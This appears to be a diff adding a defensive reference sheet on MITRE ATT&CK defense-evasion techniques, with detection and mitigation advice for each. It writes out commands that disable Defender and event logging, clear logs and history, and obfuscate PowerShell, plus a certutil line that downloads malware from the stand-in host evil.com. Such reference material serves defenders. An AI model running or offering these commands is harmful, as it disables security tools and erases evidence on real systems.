@@ -1,0 +1,140 @@
+MITRE ATT&CK Framework - Defense Evasion (TA0005)
+==================================================
+
+Defense Evasion is the largest tactic in MITRE ATT&CK by number of techniques. Adversaries use these techniques to avoid detection and analysis throughout the attack lifecycle.
+
+---
+
+T1562 - Impair Defenses
+------------------------
+Adversaries disable or interfere with defensive tools and logging to reduce detection probability.
+
+Sub-techniques:
+- T1562.001 - Disable or Modify Tools: Stopping AV/EDR services, modifying security software configuration.
+  Commands: sc stop WinDefend, Set-MpPreference -DisableRealtimeMonitoring $true
+
+- T1562.002 - Disable Windows Event Logging: Using wevtutil.exe or auditpol.exe to disable specific log channels.
+  Commands: wevtutil sl Security /e:false, auditpol /set /category:* /success:disable
+
+- T1562.003 - Impair Command History Logging: Disabling PowerShell ScriptBlock logging, clearing bash history.
+  Commands: Set-PSReadlineOption -HistorySaveStyle SaveNothing, HISTFILE=/dev/null
+
+- T1562.006 - Indicator Blocking: Preventing security tools from collecting telemetry via API hooking or driver manipulation.
+
+Detection: Monitor for service stop events on security tools, changes to audit policy, AMSI bypass attempts.
+
+Mitigation: Tamper protection in Microsoft Defender, EDR with kernel-level protection, event log forwarding to remote SIEM (adversary can't delete logs on remote server).
+
+---
+
+T1070 - Indicator Removal
+---------------------------
+Adversaries delete or modify artifacts to remove evidence of their activity.
+
+Sub-techniques:
+- T1070.001 - Clear Windows Event Logs: wevtutil cl Security, clearing all event logs.
+- T1070.002 - Clear Linux/Mac System Logs: Deleting /var/log/ files, clearing syslog.
+- T1070.003 - Clear Command History: history -c, rm ~/.bash_history.
+- T1070.004 - File Deletion: Secure deletion of tools/malware after use. Tools: sdelete, cipher /w.
+- T1070.006 - Timestomp: Modifying file timestamps (MAC times) to blend with legitimate files or confuse forensic timeline analysis. Tools: Metasploit timestomp, PowerShell.
+- T1070.009 - Clear Persistence: Removing persistence mechanisms before discovery.
+
+Detection: Log forwarding to centralized SIEM, immutable logging, EventID 1102 (Security log cleared), EventID 104 (System log cleared).
+
+Mitigation: Remote log aggregation (Splunk, Elastic, Graylog), Windows Event Forwarding, log integrity monitoring.
+
+---
+
+T1027 - Obfuscated Files or Information
+-----------------------------------------
+Adversaries encode or encrypt content to hide malicious activity from detection.
+
+Sub-techniques:
+- T1027.001 - Binary Padding: Adding null bytes or junk data to change file hashes and evade signature-based detection.
+- T1027.002 - Software Packing: UPX, Themida, custom packers to compress and obfuscate executables.
+- T1027.003 - Steganography: Hiding malicious data within image files, audio, or other media.
+- T1027.004 - Compile After Delivery: Delivering source code and compiling on-target to avoid detection of compiled malware.
+- T1027.005 - Indicator Removal from Tools: Removing strings, debugging info, metadata from malware to hinder analysis.
+- T1027.009 - Embedded Payloads: Hiding malicious code inside legitimate documents, scripts, or executables.
+- T1027.010 - Command Obfuscation: PowerShell and command line obfuscation:
+  - Base64 encoding: powershell -enc [base64]
+  - String concatenation: po"wer"she"ll"
+  - Environment variable substitution: %co%mspec%
+
+Detection: AMSI for PowerShell script inspection (deobfuscates before execution), behavioral detection rather than signature-based, script block logging.
+
+Mitigation: Enable PowerShell ScriptBlock logging (Event 4104), constrained language mode, AMSI integration.
+
+---
+
+T1055 - Process Injection
+--------------------------
+Adversaries inject malicious code into other running processes to hide activity and bypass security controls.
+
+Sub-techniques:
+- T1055.001 - Dynamic-link Library Injection: Writing a DLL path to a remote process and using CreateRemoteThread to load it.
+- T1055.002 - Portable Executable Injection: Injecting raw shellcode into another process's memory.
+- T1055.003 - Thread Execution Hijacking: Suspending a thread, writing shellcode to its stack, resuming execution.
+- T1055.004 - Asynchronous Procedure Call (APC) Injection: Queueing APCs to thread context to execute shellcode.
+- T1055.011 - Extra Window Memory Injection: Storing shellcode in window class extra memory.
+- T1055.012 - Process Hollowing: Creating a process in suspended state, replacing its memory with malicious code, then resuming.
+- T1055.013 - Process Doppelgänging: Using NTFS transactions to create a modified executable image without writing to disk.
+
+Detection: Sysmon EventID 8 (CreateRemoteThread), EventID 10 (Process Access), behavioral analysis by EDR, memory scanning.
+
+Mitigation: EDR with memory scanning capabilities, Attack Surface Reduction rules, Control Flow Guard.
+
+---
+
+T1036 - Masquerading
+---------------------
+Adversaries make malicious processes or files appear legitimate.
+
+Sub-techniques:
+- T1036.001 - Invalid Code Signature: Using a revoked or invalid code signing certificate.
+- T1036.002 - Right-to-Left Override: Using Unicode RTLO character to reverse displayed filename (e.g., docgpj.exe displays as doc.jpg).
+- T1036.003 - Rename System Utilities: Renaming legitimate tools (cmd.exe → svchost.exe) to blend in.
+- T1036.004 - Masquerade Task or Service: Creating scheduled tasks/services with names resembling legitimate Windows services.
+- T1036.005 - Match Legitimate Name or Location: Placing malware in expected paths for legitimate software.
+- T1036.008 - Masquerade File Type: Using double extensions (.pdf.exe, .txt.bat) or misleading icons.
+
+Detection: Process creation with command line analysis, parent-child process relationship verification, code signing validation.
+
+Mitigation: Code signing requirements, application whitelisting, process monitoring with full command line logging.
+
+---
+
+T1218 - System Binary Proxy Execution (LOLBins)
+-------------------------------------------------
+Living-off-the-Land Binaries (LOLBins): Using legitimate Windows system binaries to execute malicious payloads, bypassing application whitelisting.
+
+Common LOLBins:
+- certutil.exe: Download files, decode base64 (certutil -urlcache -f http://evil.com/malware.exe output.exe)
+- regsvr32.exe: Execute COM objects/scripts remotely (Squiblydoo attack)
+- mshta.exe: Execute HTA (HTML Application) files from remote URLs
+- rundll32.exe: Execute DLL exports and JavaScript
+- wscript.exe/cscript.exe: Execute VBScript/JScript
+- installutil.exe: Execute arbitrary .NET assemblies
+- msiexec.exe: Install/execute MSI packages from remote URLs
+- bitsadmin.exe: Download files using Background Intelligent Transfer Service
+
+Detection: Command line monitoring for suspicious parameters to these utilities, LOLBAS project signatures in SIEM.
+
+Mitigation: Microsoft Defender Attack Surface Reduction rules, Windows Defender Application Control (WDAC), AppLocker.
+
+---
+
+T1497 - Virtualization/Sandbox Evasion
+----------------------------------------
+Adversaries detect whether they are running in an analysis environment and modify behavior accordingly.
+
+Techniques:
+- Check for VM artifacts: VMware registry keys (HKLM\SOFTWARE\VMware, Inc.), VirtualBox processes, Hyper-V indicators
+- Check for sandbox artifacts: Low uptime, single CPU, small RAM, no real user activity
+- Time-based evasion: Sleep for extended periods before executing, check if sleep was accelerated
+- User interaction: Only execute if mouse movement or keyboard input detected
+- Domain/environment checks: Check for expected domain name, specific file paths, network shares
+
+Detection: Behavioral differences between sandbox and real execution, run time analysis longer than typical sandbox duration.
+
+Mitigation: Improved sandbox environments that better simulate real user environments, longer analysis times.
